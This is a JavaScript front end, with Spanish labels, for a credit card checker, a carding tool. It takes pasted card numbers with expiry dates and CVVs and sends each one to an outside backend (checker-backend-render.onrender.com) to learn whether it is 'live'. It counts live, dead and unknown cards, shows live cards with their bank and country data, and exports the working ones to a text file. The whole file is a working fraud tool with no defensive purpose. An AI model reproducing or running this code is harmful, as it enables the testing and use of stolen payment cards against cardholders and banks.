const textarea = document.querySelector("textarea");
const btnIniciar = document.querySelector(".iniciar");
const btnDetener = document.querySelector(".detener");
const btnPausar = document.querySelector(".pausar");
const btnDescargar = document.querySelector(".descargar");

const vivosEl = document.querySelector(".vivos");
const muertosEl = document.querySelector(".muertos");
const desconocidasEl = document.querySelector(".desconocidas");

const resultadosDiv = document.createElement("div");
resultadosDiv.style.marginTop = "20px";
resultadosDiv.style.display = "flex";
resultadosDiv.style.flexWrap = "wrap";
resultadosDiv.style.justifyContent = "center";
document.body.appendChild(resultadosDiv);

let intervalId;
let index = 0;
let pausado = false;
let vivos = [];
let muertos = [];
let desconocidas = [];

btnIniciar.addEventListener("click", () => {
    const lineas = textarea.value.trim().split("\n").filter(linea => linea.trim() !== "");
    if (lineas.length === 0) return alert("Por favor ingresa tarjetas para verificar.");
    if (intervalId) clearInterval(intervalId);
    pausado = false;
    index = 0;
    resultadosDiv.innerHTML = "";
    intervalId = setInterval(() => {
        if (index >= lineas.length) {
            clearInterval(intervalId);
            return;
        }
        if (!pausado) {
            procesarTarjeta(lineas[index]);
            index++;
        }
    }, 2000);
});

btnPausar.addEventListener("click", () => {
    pausado = !pausado;
    btnPausar.innerText = pausado ? "Reanudar" : "Pausar";
});

btnDetener.addEventListener("click", () => {
    clearInterval(intervalId);
    index = 0;
    pausado = false;
    btnPausar.innerText = "Pausar";
});

btnDescargar.addEventListener("click", () => {
    const contenido = vivos.join("\n");
    const blob = new Blob([contenido], { type: "text/plain;charset=utf-8" });
    const enlace = document.createElement("a");
    enlace.href = URL.createObjectURL(blob);
    enlace.download = "vivas.txt";
    enlace.click();
});

function crearTarjetaVisual(data) {
    const tarjeta = document.createElement("div");
    tarjeta.style.width = "300px";
    tarjeta.style.padding = "20px";
    tarjeta.style.margin = "10px";
    tarjeta.style.borderRadius = "16px";
    tarjeta.style.background = "linear-gradient(135deg, #2c3e50, #4ca1af)";
    tarjeta.style.color = "white";
    tarjeta.style.fontFamily = "monospace";
    tarjeta.style.boxShadow = "0 0 12px rgba(0,0,0,0.4)";
    tarjeta.innerHTML = `
        <div style="font-size:18px;font-weight:bold">${data.card}</div>
        <div>💳 ${data.month}/${data.year} &nbsp; CVV: ${data.cvv}</div>
        <hr>
        <div>${data.bin.marca || ""} - ${data.bin.tipo || ""} - ${data.bin.nivel || ""}</div>
        <div>🏦 ${data.bin.banco || "Banco desconocido"}</div>
        <div>🌍 ${data.bin.pais || "País desconocido"}</div>
        ${data.bin.bandera ? `<img src="${data.bin.bandera}" height="32">` : ""}
    `;
    resultadosDiv.appendChild(tarjeta);
    resultadosDiv.scrollTop = resultadosDiv.scrollHeight;
}

function procesarTarjeta(linea) {
    const [cc, mm, yy, cvv] = linea.split("|");
    if (!cc || !mm || !yy || !cvv) return;
    fetch("https://checker-backend-render.onrender.com/check", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ number: cc, month: mm, year: yy, cvv })
    })
    .then(res => res.json())
    .then(data => {
        if (data.status === "LIVE") {
            vivos.push(linea);
            vivosEl.textContent = `Vivas: ${vivos.length}`;
            crearTarjetaVisual(data);
        } else if (data.status === "DIE") {
            muertos.push(linea);
            muertosEl.textContent = `Muertas: ${muertos.length}`;
        } else {
            desconocidas.push(linea);
            desconocidasEl.textContent = `Desconocidas: ${desconocidas.length}`;
        }
    })
    .catch(() => {
        desconocidas.push(linea);
        desconocidasEl.textContent = `Desconocidas: ${desconocidas.length}`;
    });
}
